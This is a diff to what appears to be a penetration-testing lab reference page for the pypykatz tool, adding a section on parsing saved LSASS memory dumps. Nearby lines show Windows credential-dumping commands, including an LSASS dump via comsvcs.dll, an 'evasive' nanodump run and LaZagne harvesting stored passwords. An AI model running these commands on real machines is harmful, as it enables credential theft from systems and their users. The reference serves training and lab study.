@@ -9,6 +9,32 @@ hideFooterPagination: true
 
 {/* Generated from Commands/pypykatz.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## pypykatz: choose the operation and read the result
+
+Parse an existing LSASS dump on Kali.
+
+### What the result establishes
+
+Identify the dump/hive source and recovered credential type, then keep artifacts associated with their original host.
+
+### Prerequisites and common failures
+
+An LSASS parser needs an appropriate captured artifact; protected-process behavior, architecture and dump completeness affect parsing.
+
+An LSASS minidump already obtained from your lab host; this command does not collect one.
+
+### Example 1: Read a saved dump
+
+Run in: **Kali**. Replace LSASS_DUMP with the local dump file path. Missing secrets can reflect the source host protections or logon type.
+
+```bash
+pypykatz lsa minidump LSASS_DUMP
+```
+
+## Saved commands and notebook recipes
+
+Parse an existing LSASS dump on Kali.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=pypykatz) · [All tools](/index)
@@ -46,6 +72,13 @@ rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass_PID> C:\Windows\Temp\l
 LaZagne.exe all                 :: stored app/browser/wifi creds (use the .EXE, no Python needed)
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 9. Credential dumping](/cheatsheets/ad-attack-path-worked-example#9-credential-dumping)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Parse the dump offline with pypykatz">
@@ -57,6 +90,13 @@ LaZagne.exe all                 :: stored app/browser/wifi creds (use the .EXE, 
 ```bash
 pypykatz lsa minidump /path/to/lsass.dmp
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Password Attacks: Cracking, Files, and Credential Stores — Parse the dump offline with pypykatz](/password-attacks/password-attacks-cheat-sheet#parse-the-dump-offline-with-pypykatz)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -74,6 +114,13 @@ nanodump.exe --write C:\Windows\Temp\l.dmp        :: alternative, evasive dumper
 pypykatz lsa minidump l.dmp
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — 1. LSASS — the credential goldmine](/cheatsheets/windows-post-exploitation#1-lsass-—-the-credential-goldmine)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="B. SeDebugPrivilege → read any process memory">
@@ -89,6 +136,21 @@ rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\l.dmp f
 :: then parse offline on Kali:  pypykatz lsa minidump l.dmp
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — B. SeDebugPrivilege → read any process memory](/cheatsheets/windows-post-exploitation#b-sedebugprivilege-→-read-any-process-memory)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Password Attacks: Cracking, Files, and Credential Stores](/password-attacks/password-attacks-cheat-sheet)
+
+{/* VAULT_RELATED_END */}
